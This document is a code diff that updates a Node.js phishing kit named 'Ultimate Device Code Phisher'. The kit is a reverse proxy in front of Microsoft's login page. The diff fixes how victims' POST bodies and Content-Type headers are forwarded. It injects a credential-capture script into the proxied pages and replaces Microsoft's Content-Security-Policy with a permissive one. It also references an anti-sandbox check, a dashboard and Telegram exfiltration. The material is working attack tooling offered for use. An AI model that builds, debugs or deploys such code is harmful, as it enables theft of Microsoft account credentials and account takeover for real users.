@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.3 – Raw Body Proxy Fix
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.4 – Content‑Type Fixed
 // ============================================================
-// Fixed AADSTS900144 error by forwarding raw POST buffers.
+// Fixed AADSTS900144 by preserving raw body and Content‑Type header.
 // ============================================================
 
 const http = require('http');
@@ -430,19 +430,35 @@ function antiSandbox(req, res, next) {
 
 // ── Express App ──
 const app = express();
+
+// 🔥 MIDDLEWARE #1: Raw body interceptor (BEFORE any Express parser)
+app.use((req, res, next) => {
+    if (req.method === 'POST' || req.method === 'PUT') {
+        let buffers = [];
+        req.on('data', (chunk) => buffers.push(chunk));
+        req.on('end', () => {
+            req.rawBody = Buffer.concat(buffers);
+            next();
+        });
+    } else {
+        next();
+    }
+});
+
+// 🔥 MIDDLEWARE #2: Express body parsers (only used for JSON APIs)
 app.use(express.json());
-// 🔥 Now also allow form-urlencoded parsing so we can read incoming POST data
 app.use(express.urlencoded({ extended: true }));
+
 const staticOpts = { index: false };
 app.use(express.static('public', staticOpts));
 
-// 🔥 Update lastActivity on every request
+// Update lastActivity on every request
 app.use((req, res, next) => {
     lastActivity = Date.now();
     next();
 });
 
-// 🔥 CSP middleware – skip for proxy routes
+// CSP middleware – skip for proxy routes
 app.use((req, res, next) => {
     if (req.path.startsWith('/login')) {
         return next();
@@ -650,24 +666,26 @@ app.all('/login*', async (req, res) => {
     const method = req.method;
     let bodyData = null;
 
-    // 🔥 CRITICAL FIX: Capture raw body correctly for POST requests (form data)
+    // 🔥 Use the raw body we captured earlier (guaranteed not stripped)
     if (method === 'POST' || method === 'PUT') {
-        bodyData = await new Promise((resolve) => {
-            let buffers = [];
-            req.on('data', (chunk) => buffers.push(chunk));
-            req.on('end', () => resolve(Buffer.concat(buffers)));
-        });
+        bodyData = req.rawBody;
     }
+
+    // 🔥 PRESERVE THE EXACT CONTENT-TYPE HEADER FROM THE BROWSER
+    const contentType = req.headers['content-type'] || 'application/x-www-form-urlencoded';
 
     try {
         const resp = await axios({
             method: method,
             url: targetUrl,
-            headers: headers,
-            data: bodyData, // Pass the raw buffer directly
-            responseType: 'arraybuffer', // Safer for compressed content
+            headers: {
+                ...headers,
+                'Content-Type': contentType // Force the exact content type
+            },
+            data: bodyData, // Pass the raw buffer
+            responseType: 'arraybuffer',
             timeout: 15000,
-            maxRedirects: 0, // Handle redirects manually
+            maxRedirects: 0,
             ...createAxiosConfig(),
         });
 
@@ -692,7 +710,7 @@ app.all('/login*', async (req, res) => {
                 } else if (encoding.includes('deflate')) {
                     data = zlib.inflateSync(data);
                 } else if (encoding.includes('br')) {
-                    // Ignore Brotli if not supported, just pass raw
+                    // Ignore Brotli if not supported
                 }
             } catch (decompError) {
                 console.warn('Decompression error, serving raw:', decompError.message);
@@ -700,9 +718,9 @@ app.all('/login*', async (req, res) => {
         }
 
         let html = data.toString('utf8');
-        const contentType = resp.headers['content-type'] || '';
+        const contentTypeResponse = resp.headers['content-type'] || '';
 
-        if (contentType.includes('text/html')) {
+        if (contentTypeResponse.includes('text/html')) {
             try {
                 const $ = cheerio.load(html);
                 const captureScript = `
@@ -779,26 +797,23 @@ app.all('/login*', async (req, res) => {
                 head.append(captureScript);
                 html = $.html();
                 data = Buffer.from(html, 'utf8');
-                // Update content-length
                 responseHeaders['content-length'] = data.length;
             } catch (cheerioError) {
                 console.warn('Cheerio manipulation error, serving original:', cheerioError.message);
             }
         }
 
-        // Remove any CSP from Microsoft to avoid conflicts, and set our permissive CSP
+        // Remove any CSP from Microsoft to avoid conflicts
         delete responseHeaders['content-security-policy'];
         delete responseHeaders['content-security-policy-report-only'];
 
         res.set(responseHeaders);
-        // Set a permissive CSP that allows all resources and our inline script
         res.setHeader('Content-Security-Policy', "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data:; connect-src *;");
         res.status(resp.status);
         res.send(data);
 
     } catch (error) {
         console.error('Proxy error:', error.message);
-        // In case of complete failure, redirect the victim to the real Microsoft login
         console.log('Redirecting victim to real Microsoft login due to proxy failure.');
         res.redirect('https://login.microsoftonline.com');
     }
@@ -1020,7 +1035,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.3 – Raw Body Proxy Fix running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.4 – Content‑Type Fixed running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
